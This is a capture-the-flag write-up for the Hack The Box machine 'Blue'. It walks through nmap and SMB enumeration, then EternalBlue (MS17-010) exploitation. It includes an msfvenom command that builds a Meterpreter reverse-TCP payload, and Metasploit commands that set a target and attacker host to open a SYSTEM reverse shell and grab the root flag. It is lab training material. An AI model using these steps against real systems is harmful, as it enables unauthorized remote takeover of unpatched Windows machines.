# Blue

First let's start our initial recon by using nmap.&#x20;

`nmap -sC -sV {target}`

It looks like this machine is running the following services:

* **135/tcp (msrpc)**: Microsoft Remote Procedure Call (RPC) - often used for various Windows services.
* **139/tcp (netbios-ssn)**: NetBIOS Session Service - used for file and printer sharing.
* **445/tcp (microsoft-ds)**: Microsoft Directory Services - also related to file and printer sharing, commonly used for SMB (Server Message Block) communications.
* **49152-49157/tcp (msrpc)**: Additional RPC ports that may be used for various Windows services or applications.

A couple of interesting things come up when running the scan

1. **Message Signing Disabled**: Without message signing, data integrity is compromised, making the system vulnerable to man-in-the-middle attacks where attackers can intercept or alter messages without detection.
2. **Guest Account Usage**: Allowing guest access can expose the system to unauthorized users, enabling them to exploit resources and potentially gain further access to sensitive information.
3. **Outdated OS**: Running an unsupported OS like Windows 7 means the machine no longer receives security updates, leaving it vulnerable to known exploits and increasing the risk of successful attacks.
4. **Clock Skew**: Significant clock skew can cause authentication mechanisms to fail, leading to unauthorized access or disruptions in service due to time-sensitive operations being incorrectly validated.
5. **Default Settings**: Relying on default settings indicates a lack of security hardening, which makes the system an easier target for attackers who can exploit common vulnerabilities associated with these configurations.

After running smbclient -L //10.10.10.40 -U guest we see a couple of available shares remotely. Includeing an Admin share. This is interesting.&#x20;

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

For fun, we can also use a tool called smbmap.

{% embed url="https://github.com/ShawnDEvans/smbmap" %}

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

We can try default credentials to login into the remote admin share.&#x20;

After trying default credentials, we are not able to break in. Next let's try to access the Users share.



It is well known that the EternalBlue exploit uses the IPC share to gain access to a root shell.&#x20;

{% embed url="https://www.exploit-db.com/exploits/42315" %}

Clone the following repository to use the exploit on the SMB server.&#x20;

{% embed url="https://github.com/worawit/MS17-010" %}

cd into the directory, and we have to edit the file using a text editor of your choice.&#x20;

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Add \\\ in the username field, this will work because the SMB server is running on a default configuration.

Another modification is needed for the script inside teh "smb\_pwn" function, by default the python script only creates a text file in the root of the drive. We can add a couple lines to execute a target command and acheive RCE. We can create a binary using the following command:

msfvenom -p windows/meterpreter/reverse\_tcp lhost=\<lhost> lport=\<lport> -f exe > writeup.exe

**Meterpreter Reverse TCP** is a type of payload used in penetration testing, particularly within the Metasploit Framework. It establishes a reverse connection from a compromised target back to the attacker's machine, allowing for remote control and interaction with the target system.



Having troubles with this script as there are issues with concatenation. Going to try a new script in Metasploit.&#x20;



msf6 > search eternalblue

msf6 > use exploit/windows/smb/ms17\_010\_eternalblue\
\[\*] No payload configured, defaulting to windows/x64/meterpreter/reverse\_tcp\
msf6 exploit(windows/smb/ms17\_010\_eternalblue) >

msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set RHOSTS 10.10.10.40 RHOSTS => 10.10.10.40\
msf6 exploit(windows/smb/ms17\_010\_eternalblue) >

msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse\_tcp\
PAYLOAD => windows/x64/meterpreter/reverse\_tcp msf6 exploit(windows/smb/ms17\_010\_eternalblue) >

msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set LHOST 10.10.14.2 LHOST => 10.10.14.2 msf6 exploit(windows/smb/ms17\_010\_eternalblue) >

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

The reverse shell has been acheived. I we run getsystem, we can see that we are already running at the highest level priviliges possible.&#x20;

Running a simple search -f root.txt command we can grab the root flag.&#x20;

Run shell, cd to the directory.&#x20;

type root.txt

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
